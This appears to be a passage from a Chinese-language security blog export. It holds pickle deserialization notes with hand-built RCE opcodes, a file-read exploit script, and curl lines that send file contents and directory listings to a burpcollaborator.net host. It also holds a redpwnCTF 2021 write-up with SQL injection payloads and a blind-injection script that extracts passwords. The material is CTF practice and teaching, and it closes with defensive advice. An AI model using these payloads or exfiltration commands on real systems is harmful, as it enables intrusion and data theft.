\u0026#39;__builtins__\u0026#39;) eval = getattr(__builtins__, \u0026#39;eval\u0026#39;) eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;) return # b\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\\u0026#39;get\\\u0026#39;\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\\u0026#39;__builtins__\\\u0026#39;\\ntRp5\\n0g0\\n(g5\\nS\\\u0026#39;eval\\\u0026#39;\\ntRp6\\n0g6\\n(S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\\\u0026#39;\\ntR.\u0026#39; ç„¶åæ‰‹æ“ï¼Œåœ¨è°ƒç”¨callableå‰æ·»åŠ MARKå³(ï¼Œå»æ‰tå’Œè°ƒç”¨tç”¨åˆ°çš„MARK\nä¹Ÿå°±æ˜¯[callable] [tuple] R===\u0026gt;MARK [callable] [args...] o\nb\u0026#39;\u0026#39;\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0(g0\\ng1\\nS\u0026#39;get\u0026#39;\\nop2\\n0cbuiltins\\nglobals\\np3\\n0(g3\\nop4\\n0(g2\\ng4\\nS\u0026#39;__builtins__\u0026#39;\\nop5\\n0(g0\\ng5\\nS\u0026#39;eval\u0026#39;\\nop6\\n0(g6\\nS\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;\\no.\u0026#39;\u0026#39;\u0026#39; å¯ä»¥çœ‹ä¸‹åŒºåˆ«\nä¿®æ”¹éƒ½æ˜¯ä¸€å¯¹ä¸€å¯¹çš„ï¼Œæ€»ç»“ä¸€ä¸‹æ–¹æ³•å°±æ˜¯0gxè¦å˜ä¸º0(gxï¼Œ(gxè¦å˜ä¸ºgx ï¼ŒtRæ¢æˆo\nå‚è€ƒï¼šwp\n\u0026ndash;\u0026raquo;ä½¿ç”¨_getattribute()\u0026amp;load_obj()\u0026amp;load_inst()å®ç°ä»»æ„æ–‡ä»¶è¯»å– find_class()\ndef find_class(self, module, name): # Subclasses may override this. sys.audit(\u0026#39;pickle.find_class\u0026#39;, module, name) if self.proto \u0026lt; 3 and self.fix_imports: if (module, name) in _compat_pickle.NAME_MAPPING: module, name = _compat_pickle.NAME_MAPPING[(module, name)] elif module in _compat_pickle.IMPORT_MAPPING: module = _compat_pickle.IMPORT_MAPPING[module] __import__(module, level=0) if self.proto \u0026gt;= 4: return _getattribute(sys.modules[module], name)[0] else: return getattr(sys.modules[module], name) _getattribute()\ndef _getattribute(obj, name): for subpath in name.split(\u0026#39;.\u0026#39;): if subpath == \u0026#39;\u0026lt;locals\u0026gt;\u0026#39;: raise AttributeError(\u0026#34;Can\u0026#39;t get local attribute {!r} on {!r}\u0026#34; .format(name, obj)) try: parent = obj obj = getattr(obj, subpath) except AttributeError: raise AttributeError(\u0026#34;Can\u0026#39;t get attribute {!r} on {!r}\u0026#34; .format(name, obj)) from None return obj, parent read()\ndef read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() ä»ç„¶ä»¥ä¸Šé¢webtmp(ç©¶æç¼åˆæ€ª)çš„é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªAnimalçš„å®ä¾‹ï¼Œç„¶åå°†nameæˆ–categoryçš„å€¼è®¾ç½®ä¸ºread wrapperçš„è¿”å›å€¼\nexp.py\nimport pickle import struct import base64 def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() def exploit(filename): payload_prefix = b\u0026#39;\u0026#39;\u0026#39;(\u0026#39;\u0026#39;\u0026#39; payload_body = b\u0026#34;X\u0026#34; + bytes(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, len(filename))) + bytes(filename, encoding=\u0026#34;utf-8\u0026#34;) payload_suffix = b\u0026#39;\u0026#39;\u0026#39;i__main__\\nread\\n.\u0026#39;\u0026#39;\u0026#39; payload = payload_prefix + payload_body + payload_suffix assert b\u0026#39;R\u0026#39; not in payload return payload def main(): payload = exploit(\u0026#34;flag\u0026#34;) print(\u0026#34;Payload:\u0026#34;, payload) # b\u0026#39;(X\\x04\\x00\\x00\\x00flagi__main__\\nread\\n.\u0026#39; print(\u0026#34;Length:\u0026#34;, len(payload)) print(\u0026#34;Base64:\u0026#34;, base64.b64encode(payload)) if __name__ == \u0026#34;__main__\u0026#34;: main() å†æŠŠè¿™ä¸€éƒ¨åˆ†çš„payloadç¼åˆåˆ°åˆ›å»ºAnimalå®ä¾‹çš„Opcodeä¸­å»\n# åŸ: name=\u0026#39;x\u0026#39;,category=\u0026#39;y\u0026#39; b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x01\\x00\\x00\\x00xq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; # ç¼åˆ åº”è¯¥èƒ½çœ‹å‡ºæ¥æ”¹åœ¨å“ªé‡Œäº† b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03(X\\x04\\x00\\x00\\x00flagi__main__\\nread\\nq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; ä¸€äº›å°æŠ€å·§\u0026amp;æ³¨æ„äº‹é¡¹ å½“æŠŠpayloadä½œä¸ºgetå‚æ•°è¯·æ±‚æ—¶ï¼Œurlç¼–ç æ³¨æ„æ¢è¡Œç¬¦æ˜¯%0Aè€Œä¸æ˜¯%0D%0A å¯¹payloadè¿›è¡Œb64åŠ å¯†æ—¶ï¼Œæ³¨æ„åˆ«æŠŠ\\nç»™å•ç‹¬ç¼–ç äº†ï¼ˆä¸è¿‡æ­£å¸¸éƒ½ä¸ä¼šï¼‰ å…¶ä»–æ¨¡å—çš„loadä¹Ÿå¯ä»¥è§¦å‘pickleååºåˆ—åŒ–æ¼æ´ ä¾‹å¦‚ï¼šnumpy.load()å…ˆå°è¯•ä»¥numpyè‡ªå·±çš„æ•°æ®æ ¼å¼å¯¼å…¥ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™å°è¯•ä»¥pickleçš„æ ¼å¼å¯¼å…¥ï¼›pandas.read_pickle()ç›´æ¥ä½¿ç”¨pickle.load()æ–¹æ³•\nçµæ´»è¿ç”¨burp collaborator è™½ç„¶æˆ‘ä»¬ä¸èƒ½æŠŠburpæä¾›çš„collaboratorå½“ä½œvpsæ¥ä½¿ç”¨ï¼Œè¿›è¡Œåå¼¹shellç„¶åä¸€é€šæ“ä½œï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå¼•å·+curlçš„æ–¹å¼ç›´æ¥è·å¾—ä»£ç æ‰§è¡Œå’Œç»“æœçš„è¾“å‡ºï¼›curlæœ¬èº«çš„ç”¨æ³•ä¹Ÿå¾ˆå¤šï¼Œå¯ä»¥ç›´æ¥å¸¦æ–‡ä»¶è¿›è¡Œpostï¼Œæ›´å¤šå†…å®¹å‚è§ï¼šcurl çš„ç”¨æ³•æŒ‡å—\n# åŸºæ“1 os.system(\u0026#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`) # åŸºæ“2 -då‚æ•°å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹ä½œä¸ºæ•°æ®ä½“å‘é€ï¼Œä¼šè‡ªåŠ¨æ·»åŠ è¯·æ±‚å¤´å¹¶è°ƒæ•´è¯·æ±‚æ–¹æ³• æ— éœ€-X POST os.system(\u0026#39;curl -d \u0026#39;@/flag.txt\u0026#39; http://xxxx.burpcollaborator.net/) æœ€åï¼Œå‡ºäºå®‰å…¨è§’åº¦çš„è€ƒé‡ ç¦ç”¨pickleï¼Œä½¿ç”¨Jsonæˆ–Google Protocol Buffers\nå½“ç¡®å®éœ€è¦ä½¿ç”¨pickleæ—¶ï¼Œè¦ç¡®ä¿å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚é‡å†™find_class()ï¼ˆä½¿ç”¨ç™½åå•è€Œä¸æ˜¯é»‘åå•è¿›è¡Œè¿‡æ»¤ï¼‰ã€ç¦æ­¢æŸäº›æ“ä½œç¬¦ï¼›ç”±äºåœ¨å¯¹opcodeè¿›è¡Œååºåˆ—åŒ–æ—¶å¯èƒ½ä¼šé€ æˆä»»æ„æ–‡ä»¶è¯»å†™ï¼Œä¸€å®šæå‰å¯¹é‡è¦æ–‡ä»¶åšå¥½æƒé™çš„ç®¡ç†ï¼›å¿…è¦æ—¶å¯ä»¥å¯¹ä¿¡æ¯è¿›è¡Œhmacç­¾å\nä¸¾ä¸€ä¸ªhmacçš„æ —å­\nimport hmac import pickle import base64 class Student: def __init__(self, name, age): self.name = name self.age = age def __str__(self): return \u0026#34;My name is %s, I am %d years old.\u0026#34; % ( self.name, self.age ) class HMAC_Pickler: def __init__(self, secret_key, seperator=\u0026#34;|\u0026#34;): self.secret_key = secret_key self.seperator = seperator def digital_signature(self, data): signer = hmac.new(self.secret_key) signer.update(data) return signer.hexdigest() def loads(self, data): sign = data[:32] p = data[32+len(self.seperator):] assert sign == self.digital_signature(p), (\u0026#34;Data is tampered by someone.\u0026#34;) return pickle.loads(p) def dumps(self, obj): p = pickle.dumps(obj) sign = self.digital_signature(p) return \u0026#34;%s%s%s\u0026#34; % (sign, self.seperator, p) def main(): SECRET_KEY = b\u0026#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f\u0026#39; pickler = HMAC_Pickler(SECRET_KEY) obj = Student(\u0026#34;Jack\u0026#34;, 19) print(obj) p = pickler.dumps(obj) print(p) o = pickler.loads(p) print(o) p += \u0026#34;I am hacker, trying evil things\u0026#34; x = pickler.loads(p) print(x) if __name__ == \u0026#34;__main__\u0026#34;: main() æ —å­9 - [BalsnCTF 2019] Pyshv3 è¿™æ¬¡çš„find_class()æ²¡æœ‰å˜åŒ–ï¼Œä½†æ˜¯structsæœ‰å…·ä½“çš„å®ç°\nåŒæ—¶server.pyçš„é€»è¾‘ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ï¼Œä¸ç”¨rceäº†ï¼Œç›´æ¥æœ‰ä¸€ä¸ªæ‹¿flagçš„å‡½æ•°ï¼Œä½†éœ€è¦self.user.privilegedä¸ºTrueæ‰å¯ä»¥è¿”å›\nè€Œè¿™ä¸ªself.user.privilegedåœ¨ä¸€å¼€å§‹å°±è¢«è®¾ä¸ºäº†False\nemmmm è¿™æ€ä¹ˆç»•è¿‡æï¼Ÿ\nå…ˆè¯´éé¢„æœŸï¼Œå°†__builtins__å¤åˆ¶åˆ°moduleså±æ€§ä¸Šï¼›å†è¯´è¯´é¢„æœŸè§£ã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œæœ‰__get__ï¼Œ__set__è¿™æ ·æè¿°å™¨åè®®æ–¹æ³•çš„å¯¹è±¡ç§°ä¸ºæè¿°å™¨descriptorã€‚é»˜è®¤å¯¹å±æ€§çš„è®¿é—®æ§åˆ¶éƒ½æ˜¯ä»å¯¹è±¡çš„å­—å…¸__dict__é‡Œé¢è¿›è¡Œè·å–(get)ï¼Œè®¾ç½®(set)å’Œåˆ é™¤(delete)çš„æ–¹æ³•ï¼ˆå‰é¢çš„é‚£é“é¢˜ä¹Ÿç”¨åˆ°è¿™ä¸ªç‚¹ï¼‰ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œa.xçš„æŸ¥æ‰¾é¡ºåºæ˜¯a.__dict__['x']ï¼Œä¹‹åtype(a).__dict__['x']ï¼Œç„¶åæ‰¾type(a)çš„çˆ¶ç±»ã€‚å¦‚æœæŸ¥æ‰¾åˆ°çš„å€¼æ˜¯ä¸€ä¸ªæè¿°å™¨ï¼Œpythonå°±ä¼šè°ƒç”¨æè¿°å™¨çš„æ–¹æ³•æ¥é‡å†™é»˜è®¤çš„æ§åˆ¶è¡Œä¸ºï¼Œè¿™ä¸ªé‡å†™å‘ç”Ÿåœ¨è¿™ä¸ªæŸ¥æ‰¾ç¯èŠ‚çš„å“ªé‡Œå–å†³äºå®šä¹‰äº†å“ªä¸ªæè¿°å™¨æ–¹æ³•ã€‚ï¼ˆæ³¨æ„ï¼šåªæœ‰åœ¨æ–°å¼ç±»ä¸­æ—¶æè¿°å™¨æ‰èµ·ä½œç”¨ï¼‰ï¼ˆæ›´å¤šä»‹ç»å‚è§ï¼šä»€ä¹ˆæ˜¯æè¿°ç¬¦ï¼ˆdescriptorï¼‰ï¼‰\næˆ‘ä»¬åˆ©ç”¨æè¿°å™¨çš„ç‰¹æ€§ï¼Œå°†Userç±»çš„__set__æ–¹æ³•é‡è½½ä¸ºstructs.Userï¼Œå¹¶æŠŠå®ƒçš„privilegedå±æ€§èµ‹å€¼ä¸ºä¸€ä¸ªUserå®ä¾‹ã€‚å½“è¿›è¡Œself.user.privilegedè¢«èµ‹å€¼æ—¶è§¦å‘__set__ï¼Œä½†ç”±äºå·²ç»è¢«é‡å†™ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«èµ‹å€¼Falseï¼Œè€Œæ˜¯ä¿æŒåŸæ ·ï¼Œè¿˜æ˜¯ä¸€ä¸ªUserå®ä¾‹ã€‚åœ¨åé¢ifåˆ¤æ–­æ—¶ï¼ŒUserå®ä¾‹å½“ç„¶æ˜¯Trueï¼Œå°±å¯ä»¥ç»•è¿‡äº†ã€‚\npker\nUser = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;User\u0026#39;) User.__set__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;User\u0026#39;) user = User(0, 0) User.privileged = user return user opcode\nb\u0026#34;cstructs\\nUser\\np0\\n0g0\\n(}(S\u0026#39;__set__\u0026#39;\\ncstructs\\nUser\\ndtbg0\\n(I0\\nI0\\ntRp2\\n0g0\\n(}(S\u0026#39;privileged\u0026#39;\\ng2\\ndtbg2\\n.\u0026#34; è€ƒè™‘åˆ°è¿™ä¸ªé¢˜æ›´ç»¼åˆäº†pythonçš„ç›¸å…³ç‰¹æ€§ï¼Œæ‰€ä»¥æŠŠè¿™ä¸ªé¢˜æ”¾åœ¨æœ€åã€‚\nä»æ–°å»ºæ–‡ä»¶åˆ°å†™å®Œç”¨äº†å‡ å¤©æ—¶é—´ï¼Œç»†ç»†åœ°æ•´ç†ç›¸å…³çŸ¥è¯†ï¼Œä¹Ÿç®—æ˜¯å¯¹ååºåˆ—åŒ–è¿™ä¸ªçŸ¥è¯†ç‚¹çš„è®¤è¯†æ¸…æ™°äº†ä¸å°‘ã€‚è¿˜æœ‰ä¸€ä¸ªPyYAMLçš„ååºåˆ—åŒ–é—®é¢˜ï¼Œç”±äºç¯‡å¹…é—®é¢˜æ‹†å¼€æ¥æ”¾åˆ°ä¸‹ä¸€ç¯‡ä¸­ã€‚è‡ªè®¤ä¸ºæ€»ç»“çš„è¿˜æ˜¯æ¯”è¾ƒè¯¦ç»†çš„ï¼ˆå˜¿å˜¿xï¼‰ä¸è¿‡è‚¯å®šè¿˜æœ‰ä¸å‘¨åˆ°çš„åœ°æ–¹ï¼Œä¹‹åå¦‚é‡åˆ°æ›´å¤šçŸ¥è¯†è¿˜ä¼šè¿›è¡Œè¡¥å……ã€‚\nè‡ªå·±è¿˜æ˜¯æœ‰æƒ°æ€§å•Šï¼Œå…¶å®ååºåˆ—åŒ–ç¬¬ä¸€ç¯‡æ€»ç»“çš„æ˜¯phpï¼Œå¯æ˜¯åˆ°ç°åœ¨è¿˜æœ‰å‡ ä¸ªäºŒçº§æ ‡é¢˜ä¸‹é¢æ˜¯ç©ºç™½çš„â€¦â€¦åªèƒ½å…ˆç»™è‡ªå·±æ‰¾ä¸ªå€Ÿå£ï¼šphpååºåˆ—åŒ–çš„ä¸œè¥¿å®åœ¨æ˜¯å¤ªå¤šäº†TAT\næœ€åæ”¾ä¸€ä¸‹å…¨ç¯‡ç”¨åˆ°çš„çš„å‚è€ƒæ–‡ç« ï¼ˆéƒ¨åˆ†å·²å†™åœ¨å¯¹åº”æ ‡é¢˜ä¸‹é¢ï¼‰ï¼Œä¸åˆ†å…ˆå~\nPython ååºåˆ—åŒ–æ¼æ´å­¦ä¹ ç¬”è®° | ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ Python ååºåˆ—åŒ–æ¼æ´ | pickleååºåˆ—åŒ–åˆæ¢ | Python pickle ååºåˆ—åŒ–å®ä¾‹åˆ†æ | Python ååºåˆ—åŒ–å®‰å…¨é—®é¢˜ï¼ˆä¸€ï¼‰ - Python ååºåˆ—åŒ–å®‰å…¨é—®é¢˜ï¼ˆäºŒï¼‰ | ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ \u0026amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿ | å…³äºPython secçš„ä¸€äº›ç®€å•çš„æ€»ç»“ | Sour Pickles A serialised exploitation guide in one part - Macro Slaviero | ğŸ Security Issues in Python Pickle\n","date":"2021-08-12T11:48:05+08:00","permalink":"https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/","section":"posts","tags":["python","unserialize"],"title":"ååºåˆ—åŒ–ä¸“é¢˜ç¬”è®°Â·å£¹Â·pythonç¯‡"},{"categories":["CTF"],"contents":"å®˜æ–¹çš„dockeråœ°å€~~å¤ç°ä¸€æœ¬æ»¡è¶³~https://github.com/redpwn/redpwnctf-2021-challenges\nweb/inspect-me See if you can find the flag in the source code!\ninspect-me.mc.ax\nweb/orm-bad I just learned about orms today! They seem kinda difficult to implement though\u0026hellip; Guess I\u0026rsquo;ll stick to good old raw sql statements!\norm-bad.mc.ax\nDownloads - app.js\nä¸‡èƒ½å¯†ç ï¼šadmin\u0026rsquo;or'1 : admin\nå…³äºorm ä¹‹åè¦è¡¥ä¸€ä¸‹çŸ¥è¯†ï¼šObjectâ€“relational mapping ORM å®ä¾‹æ•™ç¨‹\nweb/secure Just learned about encryptionâ€”now, my website is unhackable!\nsecure.mc.ax\nDownloads - index.js\nè¿˜æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå°è¯•ä¸‡èƒ½å¯†ç \næºç æ˜¯è¿™æ ·çš„\nconst crypto = require(\u0026#39;crypto\u0026#39;); const express = require(\u0026#39;express\u0026#39;); const db = require(\u0026#39;better-sqlite3\u0026#39;)(\u0026#39;db.sqlite3\u0026#39;); db.exec(`DROP TABLE IF EXISTS users;`); db.exec(`CREATE TABLE users( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT );`); db.exec(`INSERT INTO users (username, password) VALUES ( \u0026#39;${btoa(\u0026#39;admin\u0026#39;)}\u0026#39;, \u0026#39;${btoa(crypto.randomUUID)}\u0026#39; )`); const app = express(); app.use( require(\u0026#39;body-parser\u0026#39;).urlencoded({ extended: false, }) ); app.post(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { if (!req.body.username || !req.body.password) return res.redirect(\u0026#39;/?message=Username and password required!\u0026#39;); const query = `SELECT id FROM users WHERE username = \u0026#39;${req.body.username}\u0026#39; AND password = \u0026#39;${req.body.password}\u0026#39;;`; try { const id = db.prepare(query).get()?.id; if (id) return res.redirect(`/?message=${process.env.FLAG}`); else throw new Error(\u0026#39;Incorrect login\u0026#39;); } catch { return res.redirect( `/?message=Incorrect username or password. Query: ${query}` ); } }); ä»–è¿™ä¸ªb64åŠ å¯†æ˜¯å‘ç”Ÿåœ¨å‰ç«¯çš„ï¼Œä¹Ÿå°±æ˜¯åœ¨å‘åŒ…çš„æ—¶å€™å°±å·²ç»å¯¹postçš„æ•°æ®è¿›è¡Œäº†é¢„å¤„ç†ï¼Œè€Œå…·ä½“åˆ°åç«¯è¿›è¡Œsqlè¯­å¥çš„æŸ¥è¯¢æ—¶ä¼šç›´æ¥æ‹¼æ¥req.body.username/passwdçš„æ•°æ®ï¼Œä¸ä¼šè¿›è¡Œè¿›ä¸€æ­¥çš„æ£€æŸ¥æˆ–è¿‡æ»¤\nåˆšå¼€å§‹æƒ³å¤æ‚äº†\nweb/cool Aaron has a message for the cool kids. For support, DM BrownieInMotion.\ncool.mc.ax\nDownloads - app.py\nç™»å½•æ¡†ï¼Œå¯ä»¥æ³¨å†Œ å…ˆå°è¯•test: test ç™»å½•æˆåŠŸä½†æ˜¯æ— æ³•è·å–ä¿¡æ¯ï¼ˆæ³¨å†Œåä¹Ÿä¼šè·³è½¬è¿™ä¸ªé¡µé¢\nç•™æ„cookieéƒ¨åˆ†ï¼Œæ˜¯ç†Ÿæ‚‰çš„flask sessionï¼Œæ‰”è¿›å·¥å…·é‡Œè§£å¯†\nå†å‚è€ƒæºç ä¸­çš„/messageéƒ¨åˆ†ï¼Œè€ƒè™‘å°†sessionè®¾ä¸º{\u0026ldquo;username\u0026rdquo;:\u0026ldquo;ginkoid\u0026rdquo;}åç™»å…¥æŸ¥çœ‹ä¿¡æ¯ï¼ˆå¼€å§‹ä»¥ä¸ºæ˜¯sessionä¼ªé€  åæ¥å‘ç°ä¸æ˜¯ï¼‰\nçœ‹ä¸€ä¸‹å…¶ä»–éƒ¨åˆ†çš„æºç ï¼Œé¦–å…ˆæ˜¯init()\ndef init(): # this is terrible but who cares execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) execute(\u0026#39;DROP TABLE users;\u0026#39;) execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) # put ginkoid into db ginkoid_password = generate_token() execute( \u0026#39;INSERT OR IGNORE INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;ginkoid\\\u0026#39;, \\\u0026#39;{ginkoid_password}\\\u0026#39;);\u0026#39; ) execute( f\u0026#39;UPDATE users SET password=\\\u0026#39;{ginkoid_password}\\\u0026#39;\u0026#39; f\u0026#39;WHERE username=\\\u0026#39;ginkoid\\\u0026#39;;\u0026#39; ) ç„¶åæ˜¯åœ¨åˆ›å»ºç”¨æˆ·create_user()å’Œç™»å½•check_login()æ—¶éƒ½ä¼šæ£€æµ‹ç”¨æˆ·åä¸­æ˜¯å¦æœ‰éæ³•å­—ç¬¦ï¼ˆç™½åå•æ˜¯26ä¸ªè‹±æ–‡å­—æ¯å¤§å°å†™å’Œæ•°å­—ï¼‰ï¼Œç®—æ˜¯æŒºä¸¥æ ¼çš„\ndef create_user(username, password): if any(c not in allowed_characters for c in username): return (False, \u0026#39;Alphanumeric usernames only, please.\u0026#39;) if len(username) \u0026lt; 1: return (False, \u0026#39;Username is too short.\u0026#39;) if len(password) \u0026gt; 50: return (False, \u0026#39;Password is too long.\u0026#39;) other_users = execute( f\u0026#39;SELECT * FROM users WHERE username=\\\u0026#39;{username}\\\u0026#39;;\u0026#39; ) if len(other_users) \u0026gt; 0: return (False, \u0026#39;Username taken.\u0026#39;) execute( \u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39; # passwdéƒ¨åˆ†å¯æ§ ) return (True, \u0026#39;\u0026#39;) è€ƒè™‘äº†ä¸€ä¸‹äºŒæ¬¡æ³¨å…¥ï¼Œå› ä¸ºæ³¨å†Œæ—¶çš„passwdéƒ¨åˆ†å®Œå…¨å¯æ§ï¼Œè®¾æƒ³æ˜¯è¿™æ ·çš„\næ„é€ passwdéƒ¨åˆ†ä¸º '),('ginkoid','passwd\nemmmm ä½†æ˜¯è¿™é‡Œä¸ç®¡æ˜¯æ˜æ–‡è¿˜æ˜¯url encodeéƒ½ä¼šæœ‰500é”™è¯¯ï¼Œè€Œä¸”è¿™é‡Œè¿”å›çš„æ—¶correct_password[0][0]==passwordï¼Œä¹Ÿç®—æ˜¯æœç»äº†è¿™ç§å¤šæ·»åŠ ä¸€æ¡ä¿¡æ¯çš„å¯èƒ½ï¼Œä¹‹å‰å·²ç»åˆå§‹åŒ–çš„å¯†ç ä¼šæ˜¯[0][0]ï¼Œè€Œæ–°æ’å…¥çš„passwdå°†æ˜¯[1][0]ï¼›å¹¶ä¸”åœ¨init()æ—¶å®šä¹‰usernameæ˜¯primary ä¹Ÿä¸å¯èƒ½æœ‰é‡å¤çš„\nâ€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™å°±åœåˆ°è¿™é‡Œäº†ï¼Œä¹Ÿæ˜¯å½“æ—¶äº†è§£çš„å¤ªå°‘ï¼Œæ€è·¯å¾ˆå®¹æ˜“å°±æ–­æ‰äº†ã€‚ã€‚ã€‚ä»¥ä¸‹æ˜¯å¤ç°\nåœ¨çœ‹äº†è¿™ç¯‡wpä¹‹åï¼Œå‘ç°è¿™ä½å¸ˆå‚…æœ€å¼€å§‹è·Ÿæˆ‘çš„æ€è·¯æ˜¯ä¸€æ ·çš„ éƒ½æƒ³åˆ©ç”¨inserté‚£ä¸€å¥ï¼Œéƒ½æƒ³æ›¿æ¢æ‰æ•°æ®åº“ä¸­åŸæ¥å­˜æœ‰çš„ginkoidçš„å¯†ç ï¼›è¿™ä½å¸ˆå‚…ç”¨çš„payloadæ˜¯\n\u0026#39;),(\u0026#39;ginkoid\u0026#39;,\u0026#39;\u0026#39;) ON CONFLICT DO UPDATE SET password=\u0026#39;\u0026#39;;-- å…¶ä¸­çš„ON CONFLICT DO UPDATE SETï¼Œåœ¨è¿™ç¯‡å®˜æ–¹æ–‡æ¡£é‡Œå†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™ä½å¸ˆå‚…ç»™çš„payloadå¾ˆå¥½ï¼ˆæˆ‘å½“æ—¶åˆ™å¯¹è¿™ä¸ªsqlè¯­å¥å¹¶ä¸æ¸…æ¥šï¼‰ä½†æ˜¯æ­£å¦‚ä»–æ‰€è¯´çš„ï¼Œwhich is 8 characters over the limit, which won\u0026rsquo;t do.\næœ€åä½¿ç”¨ç›²æ³¨çš„æ–¹å¼ï¼Œå…ˆä¸Šä¸€ä¸‹è„šæœ¬ ï¼ˆè¿™é‡Œæ˜¯æ¥æºï¼‰å†è¯´è¯´æ€è·¯\nimport time import requests url = \u0026#34;https://cool.mc.ax/\u0026#34; # url = \u0026#34;http://127.0.0.1:5000/\u0026#34; prefix = \u0026#34;asdfjwfoijweoijfojiewfj\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#34; val = \u0026#34;\u0026#34; for i in range(32): username = prefix + str(time.time_ns()).replace(\u0026#34;0\u0026#34;, \u0026#34;\u0026#34;)\t# æ³¨æ„ç™½åå•é‡Œæ²¡æœ‰0 è¦æ¢æ‰ password = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; resp = requests.post(url + \u0026#34;register\u0026#34;, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password}).text for c in charset: resp = requests.post(url, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: c}).text if \u0026#34;Incorrect\u0026#34; not in resp: print(c) val += c break print(val) æ³¨å…¥ç‚¹ä»ç„¶æ˜¯ä¸Šæ–‡æåˆ°çš„/registerè·¯ç”±ä¸­create_user(username,password)ï¼ˆå½“æ—¶æ‰¾å¯¹äº†æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯ç›²æ³¨è¿™å—è¿˜æ˜¯åšçš„å°‘ï¼‰\nä¸»è¦çš„payloadæ˜¯\npassword = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; è¿™ä¸€å¥ï¼Œå½“è¿›å…¥åˆ°æ³¨å†Œæµç¨‹æ—¶ ä¼šæ‰§è¡Œ\nexcute(\u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39;) å³\nexcute(\u0026#39;INSERT INTO users(username, password)\u0026#39; values (\u0026#39;xxxxusernamexxxx\u0026#39;, \u0026#39;\u0026#39;||(select substr(password,n,1) from users)||\u0026#39;\u0026#39;)) å…¶ä¸­||è¿æ¥ä¸¤ä¸ªä¸åŒçš„å­—ç¬¦ä¸²ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼›æ‰€ä»¥å‘é€æ³¨å†Œè¯·æ±‚æ—¶passwordçš„å€¼å°±æ˜¯åé¢çš„æŸ¥è¯¢è¯­å¥select substr(password,n,1) from usersï¼Œè€ŒæŸ¥è¯¢è¯­å¥è¿”å›çš„æ˜¯substr(password,n,1) æ˜¯ginkoidè¿™ä¸ªè´¦æˆ·çš„å¯†ç çš„å…¶ä¸­ä¸€ä½ï¼Œè¦è·å¾—è¿™ä¸ªå€¼å…·ä½“æ˜¯ä»€ä¹ˆ éœ€è¦å†æœ‰ä¸€ä¸ªfor in _ in charsetéå†ï¼Œåœ¨ç™»å½•å¤„ 